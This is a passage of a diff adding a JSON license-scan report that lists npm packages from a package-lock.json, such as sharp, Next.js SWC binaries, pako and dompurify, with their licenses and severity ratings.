+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-win32-ia32",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0 AND LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-win32-x64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0 AND LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/env",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-darwin-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-darwin-x64",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-linux-arm64-gnu",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-linux-arm64-musl",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-linux-x64-gnu",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-linux-x64-musl",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-win32-arm64-msvc",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@next/swc-win32-x64-msvc",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@swc/helpers",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@types/pako",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@types/raf",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@types/trusted-types",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "base64-arraybuffer",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "baseline-browser-mapping",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "caniuse-lite",
+          "FilePath": "package-lock.json",
+          "Name": "CC-BY-4.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "canvg",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "client-only",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "core-js",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "css-line-break",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "detect-libc",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "dompurify",
+          "FilePath": "package-lock.json",
+          "Name": "(MPL-2.0 OR Apache-2.0)",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "fast-png",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "fflate",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "iobuffer",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "nanoid",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "pako",
+          "FilePath": "package-lock.json",
+          "Name": "(MIT AND Zlib)",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "performance-now",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "picocolors",
+          "FilePath": "package-lock.json",
+          "Name": "ISC",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "postcss",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "raf",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "regenerator-runtime",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "UNKNOWN",
+          "Category": "unknown",
+          "PkgName": "rgbcolor",
+          "FilePath": "package-lock.json",
+          "Name": "MIT OR SEE LICENSE IN FEEL-FREE.md",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "scheduler",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "semver",
+          "FilePath": "package-lock.json",
+          "Name": "ISC",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "sharp",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "source-map-js",
+          "FilePath": "package-lock.json",
+          "Name": "BSD-3-Clause",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "stackblur-canvas",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "styled-jsx",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "svg-pathdata",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "text-segmentation",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "unencumbered",
+          "PkgName": "tslib",
+          "FilePath": "package-lock.json",
+          "Name": "0BSD",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "utrie",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        }
+      ]
+    }
+  ]
+}
